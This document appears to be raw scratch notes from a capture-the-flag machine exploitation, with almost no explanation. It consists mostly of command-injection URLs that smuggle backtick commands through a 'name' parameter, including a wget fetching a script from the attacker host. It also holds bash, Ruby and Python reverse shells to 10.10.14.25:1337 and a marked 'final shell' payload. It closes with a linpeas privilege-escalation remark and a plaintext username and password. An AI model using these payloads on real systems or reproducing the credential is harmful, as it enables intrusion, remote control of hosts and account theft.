
[http://10.10.14.25:8000/?name=](http://10.10.14.25:8000/?name=){’%20`wget http://10.10.14.25:8000/ggwp.sh -o /tmp/sysctl/ggwp.sh`'}

[http://10.10.14.25:8000/?name=](http://10.10.14.25:8000/?name=){’%20`ls -la`'}

[http://10.10.14.25:8000/?name=](http://10.10.14.25:8000/?name=){’%20`chmod 777 /tmp/kk.sh`'}

[http://10.10.14.25:8000/?name=](http://10.10.14.25:8000/?name=){’%20`ls -la`'}

; bash /tmp/sh.sh;

echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.25/1337 0>&1' > /tmp/sysctl/gg.sh

ruby -rsocket -e’f=TCPSocket.open("10.10.14.25",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1337)

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

[http://10.10.14.25:8000/?name=](http://10.10.14.25:8000/?name=){’%20`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`'}

Final Shell  
[http://10.10.14.25:8000/?name=](http://10.10.14.25:8000/?name=){’%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`'}

[https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/) => shell collection

I RUN linpeas and i found => ruby->bundles->config-> with red color and i open it and get doneee…

"henry:Q3c1AqGHtoI0aXAYFH"